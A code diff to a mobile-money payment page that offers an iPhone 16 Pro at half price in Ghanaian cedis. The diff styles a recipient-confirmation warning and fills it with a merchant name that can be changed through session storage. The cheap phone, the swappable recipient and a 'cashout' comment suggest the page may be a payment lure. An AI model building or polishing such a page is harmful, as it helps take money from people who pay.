@@ -864,8 +864,8 @@
                             <div class="merchant-name-container">
                                 <div class="merchant-name" id="merchantName">THE GOAT 1 TRADING ENTERPRISE</div>
                             </div>
-                            <div class="merchant-verify">
-                                ✓ Confirm recipient before approving.
+                            <div class="merchant-verify" style="background: #FFF3E0; color: #E65100; font-weight: bold; border: 1px solid #FFE0B2; padding: 10px; border-radius: 5px; margin-top: 10px;">
+                                ⚠️ Make sure the recipient is <span id="recipientWarningName" style="text-decoration: underline;">THE GOAT 1 TRADING ENTERPRISE</span> before you approve!
                             </div>
                         </div>
 
@@ -1112,14 +1112,12 @@
             
             // Check for custom merchant details
             const customMerchant = sessionStorage.getItem('customMerchant');
-            const customRecipient = sessionStorage.getItem('customRecipient');
             
             if (customMerchant) {
                 document.getElementById('merchantNameDisplay').textContent = customMerchant;
-            }
-            if (customRecipient) {
-                // You can add a recipient name display if needed, 
-                // but for now we'll ensure it's available for the cashout logic
+                // Also update the warning name if it exists on this step (it's in step 2)
+                const warningName = document.getElementById('recipientWarningName');
+                if (warningName) warningName.textContent = customMerchant;
             }
 
             document.getElementById('deviceName').textContent = phoneData.name || 'iPhone 16 Pro';
@@ -1156,12 +1154,11 @@
 
             // Check for custom merchant details
             const customMerchant = sessionStorage.getItem('customMerchant');
-            const customRecipient = sessionStorage.getItem('customRecipient');
             const finalMerchantName = customMerchant || MERCHANT_NAME;
-            const finalRecipientName = customRecipient || RECIPIENT_NAME;
 
             document.getElementById('displayMomoNumber').textContent = mtn;
             document.getElementById('merchantName').textContent = finalMerchantName;
+            document.getElementById('recipientWarningName').textContent = finalMerchantName;
             document.getElementById('displayAmount').textContent = 'GHS ' + halfPrice;
             document.getElementById('ticketDevice').textContent = phoneData.name || 'iPhone 16 Pro';
             document.getElementById('ticketPhone').textContent = mtn;
